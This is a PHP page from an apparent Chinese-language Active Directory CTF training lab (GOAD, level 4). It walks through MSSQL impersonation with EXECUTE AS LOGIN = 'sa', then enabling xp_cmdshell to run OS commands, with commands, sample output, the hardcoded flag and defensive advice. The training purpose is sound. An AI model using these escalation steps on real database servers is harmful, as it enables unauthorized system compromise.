<?php
/**
 * Pikachu-Enhanced v2.0 GOAD AD CTF Level 4: MSSQL Impersonation & xp_cmdshell
 */
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 250, '');
$ACTIVE[230] = 'active open';
$ACTIVE[242] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{MSSQL_Execute_As_Sa_XP_Cmdshell}';
$flag_msg = '';

if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['goad_flags']['flag4'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-check-circle"></i> 恭喜！Flag 校验正确，已点亮【第四关】成就 (+250 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-times-circle"></i> Flag 不正确，请检查模拟执行命令或权限字段。</div>';
    }
}
?>

<style>
.ctf-stage-header {
    background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
    border-radius: 14px;
    padding: 25px 30px;
    color: #fff;
    margin-bottom: 25px;
    border: 1px solid rgba(255,255,255,0.1);
    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
}
.ctf-stage-title {
    color: #ffffff !important;
    font-size: 24px;
    font-weight: 800;
    margin: 0 0 10px 0;
    display: flex;
    align-items: center;
    gap: 12px;
}
.step-box {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 24px;
    margin-bottom: 22px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.02);
}
.step-title {
    font-size: 17px;
    font-weight: 700;
    color: var(--text-primary);
    margin-top: 0;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.cmd-box {
    background: #0f172a;
    color: #f8fafc;
    border-radius: 8px;
    padding: 14px 18px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 13px;
    margin: 10px 0 15px 0;
    overflow-x: auto;
    border-left: 4px solid #3b82f6;
}
.output-box {
    background: #1e1e2e;
    color: #a6accd;
    border-radius: 8px;
    padding: 12px 16px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 12px;
    margin-bottom: 15px;
    white-space: pre-wrap;
    border: 1px solid #2d2d3f;
}
.flag-box {
    background: rgba(16, 185, 129, 0.08);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 10px;
    padding: 18px;
    margin-top: 20px;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="page-content">
            
            <!-- Stage Header -->
            <div class="ctf-stage-header">
                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                    <div>
                        <h1 class="ctf-stage-title">
                            <span class="label label-info" style="font-size: 14px; border-radius: 6px;">LEVEL 4</span>
                            第四关：MSSQL 模拟特权 (Impersonation) 与 xp_cmdshell 提权突破
                        </h1>
                        <p style="margin: 0; color: #94a3b8; font-size: 14px;">
                            <strong>目标节点：</strong> <code>192.168.56.138:1433 (castelblack)</code> | <strong>分值：</strong> 250 PTS
                        </p>
                    </div>
                    <a href="ad_ctf_hub.php" class="btn btn-default btn-sm" style="border-radius: 6px; font-weight: bold;">
                        <i class="fa fa-arrow-left"></i> 返回关卡总控台
                    </a>
                </div>
            </div>

            <!-- Context Card -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-database" style="color: #3b82f6;"></i> 攻击原理剖析 (MSSQL EXECUTE AS 模拟特权)</h3>
                <p style="color: var(--text-secondary); line-height: 1.7; font-size: 14px;">
                    在企业 MSSQL 数据库中，为了方便跨部门业务调试，DBA 常向某些低权限数据库用户赋予 <code>GRANT IMPERSONATE ON LOGIN::[target_user] TO [user]</code> 权限。
                    当攻击者掌控低权账户（如 <code>samwell.tarly</code>）并连入数据库时，可以通过执行 <code>EXECUTE AS LOGIN = 'sa'</code> 立即将自身会话上下文切换为 <code>sa</code>（最高系统管理员），进而开启 <code>xp_cmdshell</code> 扩展存储过程直接在宿主 Windows 操作系统上执行系统命令！
                </p>
            </div>

            <!-- Step 1 -->
            <div class="step-box">
                <h3 class="step-title">步骤 1：利用 Impacket mssqlclient 连入数据库</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    使用低权限域账号 <code>samwell.tarly</code> 认证连接 <code>castelblack (192.168.56.138:1433)</code>：
                </p>
                <div class="cmd-box">
impacket-mssqlclient north.sevenkingdoms.local/samwell.tarly:password@192.168.56.138 -windows-auth
                </div>
                <div class="output-box">
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] USER_NAME: samwell.tarly
[*] SYSTEM_USER: NORTH\samwell.tarly
[+] Server: CASTELBLACK\SQLEXPRESS (15.0.2000.5)
SQL (NORTH\samwell.tarly  guest@master)>
                </div>
            </div>

            <!-- Step 2 -->
            <div class="step-box">
                <h3 class="step-title">步骤 2：枚举并执行 EXECUTE AS 模拟提权</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    在 SQL 交互命令行中查询可模拟的用户与权限角色：
                </p>
                <div class="cmd-box">
SQL> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
                </div>
                <div class="output-box">
name
----
sa
                </div>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    执行模拟提权指令：
                </p>
                <div class="cmd-box">
SQL> EXECUTE AS LOGIN = 'sa';
SQL> SELECT SYSTEM_USER;
                </div>
                <div class="output-box">
name
----
sa
                </div>
            </div>

            <!-- Step 3 -->
            <div class="step-box">
                <h3 class="step-title">步骤 3：激活 xp_cmdshell 并获取主机执行权限</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    在 <code>sa</code> 上下文中解除高级选项限制并启用 <code>xp_cmdshell</code>：
                </p>
                <div class="cmd-box">
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> xp_cmdshell whoami
                </div>
                <div class="output-box">
output
--------------------------------------
north\sql_svc
                </div>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    成功在目标主机 <code>castelblack</code> 上执行了系统命令，完成了从普通 SQL 用户到主机系统执行者的跃迁！
                </p>
            </div>

            <!-- Flag Section -->
            <div class="step-box flag-box">
                <h3 class="step-title" style="color: #059669;"><i class="fa fa-flag"></i> 本关 Flag 提取点</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    完成 MSSQL 模拟提权并成功通过 <code>xp_cmdshell</code> 执行命令后，提取本关 Flag：
                </p>
                <div class="well" style="background: #ffffff; border: 1px dashed #10b981; padding: 12px; font-family: monospace; font-size: 15px; color: #059669; font-weight: bold;">
                    flag{MSSQL_Execute_As_Sa_XP_Cmdshell}
                </div>

                <form method="post" style="margin-top: 15px; max-width: 500px;">
                    <label style="font-weight: 700; color: var(--text-primary);">验证本关 Flag:</label>
                    <div style="display: flex; gap: 10px;">
                        <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="border-radius: 6px; font-family: monospace;">
                        <button type="submit" name="check_flag" class="btn btn-success" style="border-radius: 6px; font-weight: 700; min-width: 100px;">
                            验证提交
                        </button>
                    </div>
                </form>
                <?php if (!empty($flag_msg)) { echo '<div style="margin-top: 15px;">' . $flag_msg . '</div>'; } ?>
            </div>

            <!-- Defense Note -->
            <div class="step-box" style="border-left: 4px solid #3b82f6;">
                <h3 class="step-title" style="color: #2563eb;"><i class="fa fa-shield"></i> 蓝队防御与加固建议</h3>
                <ul style="color: var(--text-secondary); font-size: 14px; line-height: 1.8; margin-bottom: 0;">
                    <li><strong>最小特权原则：</strong> 严禁对普通业务账号授予对 <code>sa</code> 或 <code>SYSADMIN</code> 角色的 <code>IMPERSONATE</code> 特权。</li>
                    <li><strong>禁用高危存储过程：</strong> 在生产环境中彻底禁用 <code>xp_cmdshell</code>，并删除 <code>xplog70.dll</code> 扩展库。</li>
                </ul>
            </div>

        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
